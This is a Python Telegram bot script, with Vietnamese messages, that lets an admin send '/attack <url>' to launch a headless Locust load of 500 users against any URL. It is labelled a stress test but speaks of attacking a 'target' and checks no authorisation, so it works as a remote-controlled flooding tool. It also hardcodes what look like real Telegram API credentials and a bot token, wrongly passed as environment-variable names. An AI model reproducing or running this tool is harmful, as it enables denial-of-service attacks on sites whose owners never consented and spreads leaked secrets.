import subprocess
import os
import signal
import time
from telethon import TelegramClient, events, Button

# Lấy cấu hình từ Environment Variables của Render
API_ID = int(os.getenv("36437338", 0))
API_HASH = os.getenv("18d34c7efc396d277f3db62baa078efc", "")
BOT_TOKEN = os.getenv("8194497853:AAG6fdLREzWaNLq9oHWOCfqYiUm-avveefA", "")
ADMIN_ID = int(os.getenv("6472034224", 0))

bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
current_process = None

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    if event.sender_id != ADMIN_ID: return
    await event.reply("🔥 **Hệ thống Stress Test sẵn sàng!**\nSử dụng lệnh: `/attack <url>`")

@bot.on(events.NewMessage(pattern=r'/attack (https?://\S+)'))
async def attack_handler(event):
    global current_process
    if event.sender_id != ADMIN_ID: return
    
    if current_process and current_process.poll() is None:
        return await event.reply("⚠️ Đang có một đợt test diễn ra. Hãy /stop trước.")

    url = event.pattern_match.group(1)
    # Mặc định 500 user, spawn 50 user/giây (có thể chỉnh thêm nếu muốn)
    await event.reply(f"🚀 **Đang kích hoạt đợt tải cao!**\n🌐 Mục tiêu: `{url}`\n👤 Cường độ: 500 Users", 
                     buttons=[Button.inline("🛑 DỪNG LẠI", b"stop")])

    current_process = subprocess.Popen([
        "locust", "-f", "load_test.py", "--headless",
        "-u", "500", "-r", "50", "--host", url
    ])

@bot.on(events.CallbackQuery(data=b"stop"))
@bot.on(events.NewMessage(pattern='/stop'))
async def stop_handler(event):
    global current_process
    if current_process:
        os.kill(current_process.pid, signal.SIGTERM)
        current_process = None
        msg = "🛑 **Đã dừng tấn công.** Hệ thống đã được giải phóng."
    else:
        msg = "Chưa có tiến trình nào đang chạy."
    
    if isinstance(event, events.CallbackQuery.Event):
        await event.edit(msg)
    else:
        await event.reply(msg)

print("Bot is running...")
bot.run_until_disconnected()
